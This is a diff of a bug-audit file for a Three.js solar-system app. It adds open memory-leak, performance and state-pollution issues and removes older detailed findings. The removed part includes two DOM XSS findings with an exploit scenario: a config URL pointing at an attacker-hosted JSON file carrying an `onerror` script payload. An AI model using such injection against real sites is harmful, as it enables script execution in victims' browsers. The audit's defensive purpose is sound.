@@ -23,186 +23,60 @@
 | 019 | [FIXED] | 🔴 HIGH  | `src/trails.js:33` | Performance: TrailManager renders 1M vertices per frame |
 | 020 | [FIXED] | 🟡 MED   | `src/main.js:156` | Crash Risk: Unsafe access to `planetData.forEach` |
 | 021 | [FIXED] | 🟢 LOW   | `src/components/NavigationSidebar.js:154` | Memory Leak: Undisposed DOM event listeners |
+| 022 | [OPEN] | 🔴 HIGH  | `src/main.js:30` | Persistent State Pollution in Global Arrays |
+| 023 | [OPEN] | 🟢 LOW   | `src/input.js:135` | Memory Leak: Anonymous Window Resize Listener |
+| 024 | [OPEN] | 🟢 LOW   | `src/main.js:413` | Performance: High GC in Animation Loop |
+| 025 | [OPEN] | 🟢 LOW   | `src/input.js:225` | Memory Leak: Undisposed Button Event Listeners |
 
 ## Details
 
-### 001 - DOM XSS in Command Palette
-The `CommandPalette` class renders list items using `innerHTML` with data directly from the `planetData` object. Since `planetData` can be sourced from an external JSON file via the `?config=` URL parameter, an attacker can inject malicious script tags into the `name` or `type` fields of the JSON.
-
-```javascript
-// src/components/CommandPalette.js:223
-li.innerHTML = `
-    <span class="cmd-item-icon">${icon}</span>
-    <span class="cmd-item-text">${item.name}</span>
-    <span class="cmd-item-meta">${item.type}</span>
-`;
-```
-
-**Exploit Scenario:**
-1. Attacker hosts `evil.json`: `[{"name": "<img src=x onerror=alert(1)>", "type": "Planet"}]`
-2. Victim visits `index.html?config=https://attacker.com/evil.json`
-3. Victim opens Command Palette (Cmd+K).
-4. Malicious script executes.
-
-### 002 - DOM XSS in Navigation Sidebar
-Similar to ID 001, the `buildNavTree` function in `src/input.js` uses `innerHTML` to render navigation buttons using `itemData.name` and `itemData.type`.
-
-```javascript
-// src/input.js:354
-btn.innerHTML = `<span>${icon} ${itemData.name}</span> <span class="nav-type">${itemData.type}</span>`;
-```
-
-**Exploit Scenario:**
-1. Same setup as above.
-2. The XSS triggers immediately upon page load (if `planetData` contains the payload) because the sidebar is built during initialization.
-
-### 003 - Unhandled Promise in Initialization
-The `init()` function in `src/main.js` is an `async` function called at the top level without a `.catch()` block. If `init()` fails (e.g., inside `createSystem` or before the internal try/catch), the promise rejection is unhandled. While modern browsers log this to the console, it prevents any global error boundary or fallback UI from handling the crash gracefully.
-
-```javascript
-// src/main.js:476
-if (!window.__SKIP_INIT__) {
-    init(); // Fire and forget
-}
-```
-
-### 004 & 005 - Event Listener Memory Leaks
-Multiple components attach event listeners to the global `window` object but do not provide a mechanism to remove them.
-* `src/input.js` adds `keydown` and `resize`.
-* `src/components/CommandPalette.js` adds `keydown`.
-
-While this is a Single Page Application (SPA) where the "page" lifespan matches the session, this pattern prevents clean teardown if the application were to be restarted or wrapped in a larger framework (e.g., during tests or if switching scenes).
-
-```javascript
-// src/components/CommandPalette.js:160
-window.addEventListener('keydown', (e) => { ... });
-```
-
-### 006 - Performance: Fake Cyclic Buffer
-Replaced the `Array.unshift`/`pop` implementation with a true Ring Buffer using a fixed-size array and a `head` index pointer. This eliminates the O(N) array shifting operation per frame and reduces garbage collection pressure by reusing Vector3 objects.
-
-### 007 - Memory Leak: Undisposed Custom Materials
-The `createAsteroidBelt` function now returns a mesh with an attached `dispose()` method. This method correctly disposes of `customDepthMaterial` and `customDistanceMaterial` along with the geometry and main material.
-
-### 008 - Silent Failure: Asset Download
-Updated `download_textures.py` to track failed downloads and exit with a non-zero status code (1) if any errors occur. This ensures that CI/CD pipelines or deployment scripts fail fast if assets are missing.
-
-### 009 - State Pollution: Instance Registry
-Refactored `InstanceRegistry.addInstance` to use `Object.assign` instead of overwriting `userData` entirely. Added a `dispose()` method to `InstanceRegistry` that cleans up the injected properties (`isInstance`, `instanceId`, `instanceKey`) from the pivot objects and removes the mesh from the scene.
-
-### 010 - Logic Flaw: Cross-Object Double Click Detection
-The double-click detection logic in `src/input.js` relies on a global `lastClickTime` variable without verifying if the second click is on the same object as the first.
-
-```javascript
-// src/input.js:145
-const currentTime = Date.now();
-const isDoubleClick = (currentTime - lastClickTime) < doubleClickDelay;
-lastClickTime = currentTime;
-```
-
-**Scenario:**
-1. User clicks "Earth".
-2. User quickly moves mouse and clicks "Mars" (within 300ms).
-3. Result: The application registers a Double Click on "Mars", triggering the Focus action, even though the user intended two separate selections.
-
-### 011 - Crash Risk: Unsafe LocalStorage Access
-In `src/managers/ThemeManager.js`, `localStorage` is accessed directly in the constructor and methods. If the user has disabled cookies/storage (e.g., "Block all cookies" or Incognito mode in some browsers), this throws a `SecurityError` (DOMException), causing the application initialization to crash immediately.
-
-```javascript
-// src/managers/ThemeManager.js:20
-localStorage.setItem('theme', themeName);
-```
-
-### 012 - Memory Leak: Undisposed Event Listeners
-Several event listeners are attached to the `window` or DOM elements but are not properly cleaned up in the `dispose` methods or lack a disposal mechanism entirely.
-
-1.  `src/input.js`: The `pointerup` listener on `rendererDomElement` is never removed.
-2.  `src/input.js`: Event listeners attached to UI buttons (`btnCamera`, `btnTexture`, etc.) are not tracked or removed.
-3.  `src/main.js`: An anonymous `resize` event listener is attached to `window` and cannot be removed.
-
-```javascript
-// src/input.js:124
-rendererDomElement.addEventListener('pointerup', (event) => { ... });
-
-// src/main.js:464
-window.addEventListener('resize', () => { ... });
-```
-
-### 013 - Crash Risk: InstancedMesh Disposal
-The `InstanceRegistry.dispose` method attempts to call `.dispose()` on `group.mesh`. However, `group.mesh` is an instance of `THREE.InstancedMesh` (inheriting from `THREE.Mesh`), which does **not** have a `dispose()` method. This will throw a `TypeError` when the registry is disposed (e.g., on scene reset).
-
-```javascript
-// src/instancing.js:127
-group.mesh.dispose(); // TypeError: group.mesh.dispose is not a function
-```
-
-### 014 - Memory Leak: Orphaned Command Palette
-In `src/input.js`, a new `CommandPalette` instance is created, but the reference is not stored or returned. The `CommandPalette` constructor attaches a global `keydown` listener to `window`. Because the instance is lost, its `destroy()` method is never called by `setupInteraction`'s `dispose` function, causing the event listener to leak permanently.
-
-```javascript
-// src/input.js:367
-new CommandPalette(context.planetData, paletteCallbacks); // Reference lost
-```
-
-### 015 - GPU Memory Leak: TrailManager
-The `TrailManager` class allocates `THREE.BufferGeometry` and `THREE.Material` (which consume VRAM), but the class does not provide a `dispose()` method. When the application is reset or re-initialized, the old `TrailManager` is garbage collected by JS, but the WebGL resources remain allocated on the GPU.
-
-### 016 - Logic Bomb: Command Palette Filter
-The `filter` method in `CommandPalette` assumes that all items in the `items` array have a `name` property. If `system.json` (or a custom config) contains a malformed entry or an entry without a name, accessing `a.name.toLowerCase()` will throw a runtime error, crashing the UI.
-
-```javascript
-// src/components/CommandPalette.js:172
-const aName = a.name.toLowerCase(); // Unsafe access
-```
-
-### 017 - Regression: Anonymous Resize Listener
-Despite Bug 012 being marked as fixed, `src/main.js` still contains an anonymous event listener attached to `window` for handling resize events. Because the function is anonymous, it cannot be removed, leading to a memory leak if `main.js` is ever re-executed.
-
-```javascript
-// src/main.js:492
-window.addEventListener('resize', () => { ... });
-```
-
-### 018 - Race Condition: Loading Screen vs Async Fetch
-The `THREE.LoadingManager`'s `onLoad` callback fires when all tracked items are loaded. In `init()`, `createSun` adds a texture to the manager immediately. Then, `fetch('system.json')` is called, which is asynchronous.
-If the sun texture loads (or is cached) before the `fetch` promise resolves, `onLoad` fires, hiding the loading screen. The user sees an empty scene (only Sun) until the `fetch` completes and planets are created.
+### 022 - Persistent State Pollution in Global Arrays
+The `main.js` module maintains several top-level constant arrays (`interactionTargets`, `animatedObjects`, `planets`, `allOrbits`, etc.) that are populated during the `init()` function. However, these arrays are **never cleared** before repopulation.
+If `init()` is called more than once (e.g., during testing, hot-reloading, or a soft reset feature), these arrays will accumulate duplicate references to objects from previous runs. This leads to:
+1.  **Memory Leaks**: References to old objects prevent Garbage Collection.
+2.  **Logic Errors**: Raycasting and physics loops iterate over destroyed/stale objects, potentially causing crashes or "ghost" interactions.
 
 ```javascript
 // src/main.js
-manager.onLoad = function () { ... hides screen ... }; // Fires when count=0
+const interactionTargets = []; // Defined once
 // ...
-const sun = createSun(textureLoader, useTextures); // Adds 1 item
-// ...
-// AWAIT gap: manager.onLoad can fire here!
-const response = await fetch(configUrl);
-planetData = await response.json();
-// ...
-createSystem(...); // Adds more items
+export async function init() {
+    // ...
+    interactionTargets.push(sun); // Pushed every time init() runs
+    // No code to empty interactionTargets!
+}
 ```
 
-### 019 - Performance: TrailManager Over-Allocation
-The `TrailManager` allocates a `LineSegments` geometry with a fixed size based on `maxTrails` (default 5000) * `pointsPerTrail` (100). This results in ~1,000,000 vertices processed by the GPU every frame. The `update()` method does not update the `drawRange`, so the renderer attempts to draw all 5000 trails, even if only a few are active.
+### 023 - Memory Leak: Anonymous Window Resize Listener
+In `src/input.js`, the `setupInteraction` function adds an **anonymous** event listener to `window` to track resize events for raycasting coordinates. Because the function is anonymous, it cannot be removed in the `dispose` method, leading to a permanent memory leak if the interaction module is re-initialized.
 
 ```javascript
-// src/trails.js
-this.mesh = new THREE.LineSegments(this.geometry, this.material);
-this.mesh.frustumCulled = false; // Always render 1M vertices
-// No setDrawRange usage
+// src/input.js:135
+window.addEventListener('resize', () => {
+    width = window.innerWidth;
+    height = window.innerHeight;
+});
+// No removeEventListener in dispose()
 ```
 
-### 020 - Crash Risk: Invalid Configuration Type
-The `init` function assumes `system.json` returns a JSON Array. If a user (or custom config URL) provides a valid JSON Object (not an array), `planetData.forEach` throws a generic `TypeError`, crashing the application initialization.
+### 024 - Performance: High GC in Animation Loop
+The `animate` function in `src/main.js` creates a `new THREE.Vector3()` instance on **every frame** (60 times per second) when a focus target is active. This causes unnecessary Garbage Collection pressure, which can lead to frame drops (jank) in a long-running simulation.
+A reusable module-level "scratch" vector (like `tempVec` used elsewhere) should be employed.
 
 ```javascript
-// src/main.js:156
-planetData = await response.json();
-planetData.forEach(planetConfig => { ... }); // Crash if planetData is {}
+// src/main.js:413
+if (focusTarget) {
+    const targetPos = new THREE.Vector3(); // Allocation per frame
+    targetPos.setFromMatrixPosition(focusTarget.matrixWorld);
+    controls.target.copy(targetPos);
+}
 ```
 
-### 021 - Memory Leak: Component Listeners
-`NavigationSidebar` and `InfoPanel` attach event listeners to global DOM elements (e.g., `btn-close-nav`, `btn-follow`) in their constructors/methods. These classes do not have `dispose()` methods, and their listeners are not tracked. If the application logic ever re-initializes `setupInteraction` (or if these components were used in a dynamic context), listeners would accumulate, retaining the component instances in memory.
+### 025 - Memory Leak: Undisposed Button Event Listeners
+The `setupInteraction` function in `src/input.js` attaches event listeners to DOM buttons (e.g., `#btn-camera`, `#btn-pause`). The `dispose` method explicitly skips removing these listeners, citing "brevity" in the comments.
+While the buttons themselves are static in `index.html`, if the application logic were to re-run `setupInteraction`, duplicate listeners would be stacked on the same buttons, causing actions to trigger multiple times per click.
 
 ```javascript
-// src/components/NavigationSidebar.js:154
-this.dom.btnClose.addEventListener('click', () => this.close()); // Leaks 'this'
+// src/input.js:225
+// (Skipping individual button removeEventListener for brevity...)
 ```
